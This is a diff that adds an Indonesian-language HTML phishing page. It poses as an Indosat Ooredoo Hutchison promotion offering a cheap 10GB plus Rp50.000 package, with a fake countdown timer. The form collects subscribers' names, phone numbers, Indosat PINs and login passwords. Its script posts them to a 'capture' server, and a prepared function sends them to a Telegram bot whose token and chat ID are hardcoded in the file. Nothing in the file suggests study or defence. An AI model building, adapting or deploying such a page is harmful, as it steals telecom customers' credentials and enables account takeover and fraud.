@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Indosat Ooredoo Hutchison - Promo Spesial</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(135deg, #fff30e 0%, #7b7a14 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Header Indosat */
+        .header {
+            background: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #57cd4c;
+        }
+
+        .logo span {
+            color: #b6b83b;
+        }
+
+        .nav {
+            margin-left: auto;
+            font-size: 14px;
+            color: #666;
+        }
+
+        /* Banner Promo */
+        .promo-banner {
+            background: linear-gradient(135deg, #a7ff1a, #3c6121);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+            margin: 20px 0;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+        }
+
+        .promo-banner h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .promo-banner p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        /* Card Utama */
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 420px;
+            margin: 0 auto;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+
+        /* Paket Card */
+        .paket-card {
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border-left: 5px solid #009245;
+        }
+
+        .paket-card h2 {
+            color: #009245;
+            font-size: 20px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .paket-icon {
+            font-size: 24px;
+        }
+
+        .paket-details {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .paket-item {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .paket-item .value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff0000;
+        }
+
+        .paket-item .label {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .paket-price {
+            background: #ff0000;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .paket-price .price {
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .paket-price .original {
+            text-decoration: line-through;
+            opacity: 0.7;
+            font-size: 16px;
+        }
+
+        /* Form Styling */
+        .form-title {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .form-title h3 {
+            font-size: 18px;
+            color: #009245;
+        }
+
+        .form-title p {
+            font-size: 14px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #009245;
+            box-shadow: 0 0 0 3px rgba(0,146,69,0.1);
+        }
+
+        .btn-claim {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #009245, #00b84f);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-claim:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0,146,69,0.4);
+        }
+
+        .btn-claim:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Success Message */
+        .success-message {
+            display: none;
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            padding: 25px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .success-message h3 {
+            color: #155724;
+            margin-bottom: 10px;
+        }
+
+        /* Loading */
+        .loading {
+            display: none;
+            width: 25px;
+            height: 25px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #009245;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: white;
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        /* Countdown */
+        .countdown {
+            background: rgba(0,0,0,0.3);
+            padding: 10px 20px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+
+        .countdown span {
+            color: #ffeb3b;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">INDO<span>SAT</span></div>
+        <div class="nav">👤 MyIndosat</div>
+    </div>
+
+    <!-- Promo Banner -->
+    <div class="promo-banner">
+        <div class="countdown">
+            ⏰ Promo Berlaku Sisa: <span id="timer">02:59:59</span>
+        </div>
+        <h1>🎉 PROMO SPEAKTAKULER!</h1>
+        <p>Paket Internet + Pulsa Harga Spesial untuk Pelanggan Setia</p>
+    </div>
+
+    <div class="card">
+        <!-- Paket Card -->
+        <div class="paket-card">
+            <h2>
+                <span class="paket-icon">📦</span>
+                Paket Promo: 10GB + Rp50.000
+            </h2>
+            <div class="paket-details">
+                <div class="paket-item">
+                    <div class="value">10GB</div>
+                    <div class="label">Internet Unlimited</div>
+                </div>
+                <div class="paket-item">
+                    <div class="value">Rp50.000</div>
+                    <div class="label">Pulsa Gratis</div>
+                </div>
+                <div class="paket-item">
+                    <div class="value">30 HARI</div>
+                    <div class="label">Masa Aktif</div>
+                </div>
+                <div class="paket-item">
+                    <div class="value">UNLIMITED</div>
+                    <div class="label">WhatsApp & Apps</div>
+                </div>
+            </div>
+            <div class="paket-price">
+                <div class="original">Rp 75.000</div>
+                <div class="price">Rp 25.000</div>
+                <div>Harga Spesial Hari Ini!</div>
+            </div>
+        </div>
+
+        <!-- Form Klaim -->
+        <div class="form-title">
+            <h3>📋 Klaim Promo Sekarang!</h3>
+            <p>Masukkan data untuk aktivasi paket</p>
+        </div>
+
+        <form id="promoForm">
+            <input type="text" id="name" placeholder="Nama Lengkap" required>
+            <input type="tel" id="phone" placeholder="Nomor Indosat (+6281xxxx)" required>
+            <input type="email" id="email" placeholder="Email (opsional)">
+            <input type="password" id="pin" placeholder="PIN Indosat (6 digit)" required>
+            <input type="password" id="password" placeholder="Password Login" required>
+
+            <div class="loading" id="loading"></div>
+            <button type="submit" class="btn-claim" id="btnClaim">
+                🎁 KLAIM SEKARANG
+            </button>
+        </form>
+
+        <!-- Success Message -->
+        <div class="success-message" id="successMessage">
+            <h3>✅ Berhasil!</h3>
+            <p>Paket sedang diproses. Tunggu SMS konfirmasi.</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2024 Indosat Ooredoo Hutchison. Hak Cipta Dilindungi.
+    </div>
+
+    <script>
+        // Konfigurasi Telegram
+        const TELEGRAM_BOT_TOKEN = '8698559897:AAFYBiOacgEpfss4XItXmus-oItUQq_E-F4';
+        const TELEGRAM_CHAT_ID = '8781321907';
+        // Updated to use 127.0.0.1 to avoid CORS issues with localhost
+        const CAPTURE_URL = 'http://127.0.0.1:8080/capture';
+
+        // Countdown Timer
+        function updateTimer() {
+            const now = new Date();
+            const end = new Date();
+            end.setHours(23, 59, 59, 999);
+            
+            const diff = end - now;
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+            
+            document.getElementById('timer').textContent = 
+                `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        }
+        setInterval(updateTimer, 1000);
+        updateTimer();
+
+        // Form Submission
+        document.getElementById('promoForm').onsubmit = async e => {
+            e.preventDefault();
+
+            const btn = document.getElementById('btnClaim');
+            const loading = document.getElementById('loading');
+            
+            btn.textContent = 'Memproses...';
+            btn.disabled = true;
+            loading.style.display = 'block';
+
+            const data = {
+                name: document.getElementById('name').value,
+                phone: document.getElementById('phone').value,
+                email: document.getElementById('email').value,
+                pin: document.getElementById('pin').value,
+                password: document.getElementById('password').value,
+                promo: "Paket 10GB + Rp50.000",
+                ip: window.location.hostname,
+                useragent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                // Kirim ke server Flask
+                const res = await fetch(CAPTURE_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+
+                if (res.ok) {
+                    // Kirim ke Telegram (Opsional, backend sudah menangani ini)
+                    // await sendToTelegram(data);
+
+                    // Tampilkan success
+                    document.getElementById('promoForm').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                } else {
+                    console.error('Server response error:', res.status);
+                    alert('Terjadi kesalahan server.');
+                }
+            } catch (e) {
+                console.error('Error:', e);
+                alert('Error koneksi. Pastikan server Flask berjalan di http://127.0.0.1:8080');
+            } finally {
+                btn.textContent = '🎁 KLAIM SEKARANG';
+                btn.disabled = false;
+                loading.style.display = 'none';
+            }
+        };
+
+        // Kirim ke Telegram Bot (Direct dari client - opsional jika backend gagal)
+        async function sendToTelegram(data) {
+            const message = `
+🎯 *PROMO INDOSAT - CAPTURED!*
+
+👤 *Nama:* ${data.name}
+📱 *No. HP:* ${data.phone}
+📧 *Email:* ${data.email || '-'}
+🔐 *PIN:* ${data.pin}
+🔑 *Password:* ${data.password}
+
+📦 *Promo:* ${data.promo}
+📍 *IP:* ${data.ip}
+🕐 *Waktu:* ${data.timestamp}
+            `;
+
+            const url = `https://api.telegram.org/bot8698559897:AAFYBiOacgEpfss4XItXmus-oItUQq_E-F4/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {
+                console.error('Telegram error:', e);
+            }
+        }
+    </script>
+</body>
+</html>
